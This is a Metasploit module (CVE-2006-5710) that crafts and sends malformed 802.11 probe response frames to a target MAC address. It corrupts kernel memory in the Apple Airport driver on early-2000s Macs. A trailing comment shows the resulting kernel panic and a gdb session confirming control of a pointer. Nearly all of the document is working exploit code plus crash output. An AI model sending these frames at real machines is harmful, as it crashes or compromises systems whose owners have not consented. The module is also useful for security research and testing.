##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Lorcon2
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apple Airport 802.11 Probe Response Kernel Memory Corruption',
      'Description'    => %q{
        The Apple Airport driver provided with Orinoco-based Airport cards (1999-2003 PowerBooks, iMacs)
        is vulnerable to a remote memory corruption flaw. When the driver is placed into active scanning
        mode, a malformed probe response frame can be used to corrupt internal kernel structures, leading
        to arbitrary code execution. This vulnerability is triggered when a probe response frame is received
        that does not contain valid information element (IE) fields after the fixed-length header. The data
        following the fixed-length header is copied over internal kernel structures, resulting in memory
        operations being performed on attacker-controlled pointer values.
      },

      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'	 =>
        [
          ['CVE', '2006-5710'],
          ['OSVDB', '30180'],
        ]
    ))
    register_options(
      [
        OptInt.new('COUNT', [ true, "The number of frames to send", 2000]),
        OptString.new('ADDR_DST', [ true,  "The MAC address of the target system"])
      ], self.class)
  end

  #
  # This bug is easiest to trigger when the card has been placed into active scan mode:
  # $ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s -r 10000
  #

  def run
    open_wifi

    cnt = datastore['COUNT'].to_i

    print_status("Creating malicious probe response frame...")
    frame = create_frame()

    print_status("Sending #{cnt} frames...")
    cnt.times { wifi.write(frame) }
  end

  def create_frame
    bssid    = Rex::Text.rand_text(6)
    seq      = [rand(255)].pack('n')
    caps     = [rand(65535)].pack('n')

    frame =
      "\x50" +                      # type/subtype
      "\x00" +                      # flags
      "\x00\x00" +                  # duration
      eton(datastore['ADDR_DST']) + # dst
      bssid +                       # src
      bssid +                       # bssid
      seq   +                       # seq
      Rex::Text.rand_text(8) +      # timestamp value
      Rex::Text.rand_text(2) +      # beacon interval
      Rex::Text.rand_text(2)        # capabilities

    frame << [0x0defaced].pack('N') * ((1024-frame.length) / 4)

    return frame

  end
end

=begin

Tested on a 1.0Ghz PowerBook running 10.4.8 with the latest updates (Halloween, 2006)

Unresolved kernel trap(cpu 0): 0x300 - Data access DAR=0x000000000DEFACF7 PC=0x00000000007A2260
Latest crash info for cpu 0:
  Exception state (sv=0x3AA12A00)
    PC=0x007A2260; MSR=0x00009030; DAR=0x0DEFACF7; DSISR=0x40000000; LR=0x007A1D48; R1=0x17443B60; XCP=0x0000000C (0x300 - Data access)
    Backtrace: 0x01BC80AC 0x007A1D48 0x0079FA54 0x0079FF94 0x0079FEBC 0x002D0B94 0x002CFA5C 0x000A9314
    Kernel loadable modules in backtrace (with dependencies):
      com.apple.driver.AppleAirPort(3.4.4)@0x797000
        dependency: com.apple.iokit.IONetworkingFamily(1.5.0)@0x5f8000
Proceeding back via exception chain:
  Exception state (sv=0x3AA12A00)
    previously dumped as "Latest" state. skipping...
  Exception state (sv=0x31F13A00)
    PC=0x00000000; MSR=0x0000D030; DAR=0x00000000; DSISR=0x00000000; LR=0x00000000; R1=0x00000000; XCP=0x00000000 (Unknown)

Kernel version:
Darwin Kernel Version 8.8.0: Fri Sep  8 17:18:57 PDT 2006; root:xnu-792.12.6.obj~1/RELEASE_PPC



(gdb) showcurrentstacks
task        vm_map      ipc_space  #acts   pid  proc        command
0x01a73dd8  0x00cdaf3c  0x01a68ef0   38      0  0x003fb200  kernel_task
activation  thread      pri  state  wait_queue  wait_event
0x01a7c000  0x01a7c000   82  R
reserved_stack=0x173b0000
kernel_stack=0x17440000
stacktop=0x17443b60
0x17443b60  0x1bc80ac
0x17443be0  0x7a1d48 <com.apple.driver.AppleAirPort + 0xad48>
0x17443c60  0x79fa54 <com.apple.driver.AppleAirPort + 0x8a54>
0x17443ce0  0x79ff94 <com.apple.driver.AppleAirPort + 0x8f94>
0x17443d90  0x79febc <com.apple.driver.AppleAirPort + 0x8ebc>
0x17443df0  0x2d0b94 <_ZN22IOInterruptEventSource12checkForWorkEv+184>
0x17443e40  0x2cfa5c <_ZN10IOWorkLoop10threadMainEv+104>
0x17443e90  0xa9314 <Call_continuation+20>
stackbottom=0x17443e90


(gdb) x/3i $pc
0x7a2260 <mhp.1762+3571640>:    lbz     r8,0(r2)
0x7a2264 <mhp.1762+3571644>:    addi    r2,r2,1
0x7a2268 <mhp.1762+3571648>:    stw     r2,0(r11)

(gdb) i r $r2
r2             0xdefacf7        233811191

(gdb) x/x $r11
0x17443bb8:     0x0defacf7


(gdb) bt
#0  0x007a2260 in mhp.1762 ()
#1  0x007a1d48 in mhp.1762 ()
warning: Previous frame identical to this frame (corrupt stack?)
#2  0x007a1d48 in mhp.1762 ()
#3  0x0079fa54 in mhp.1762 ()
#4  0x0079ff94 in mhp.1762 ()
#5  0x0079febc in mhp.1762 ()
#6  0x002d0b94 in IOInterruptEventSource::checkForWork (this=0x1d80d40) at /SourceCache/xnu/xnu-792.12.6/iokit/Kernel/IOInterruptEventSource.cpp:196
#7  0x002cfa5c in IOWorkLoop::threadMain (this=0x1d803c0) at /SourceCache/xnu/xnu-792.12.6/iokit/Kernel/IOWorkLoop.cpp:267


(gdb) x/40x $r1
0x17443b60:     0x17443be0      0x22424022      0x01bc80ac      0x00000038
0x17443b70:     0x00d43c54      0x0004ffff      0x01bc81f4      0x00000210
0x17443b80:     0x02275000      0x003d8000      0x004fa418      0x00365000
0x17443b90:     0x01d803c0      0x00033e88      0x01a7c01c      0x01a7c0a4
0x17443ba0:     0x0defaced      0x01bc8000      0x0227581e      0x0defacf7
0x17443bb0:     0x00000000      0x0227581e      0x0defacf7      0x00000001
0x17443bc0:     0x00000002      0x01bc81f4      0x00000000      0x00000000
0x17443bd0:     0x17443c10      0x01a858c0      0x17443be0      0x01d80d40
0x17443be0:     0x17443c60      0x01bc81f4      0x007a1d48      0x00000000
0x17443bf0:     0x17443c20      0x00008088      0x01bc8000      0x0227581e

=end
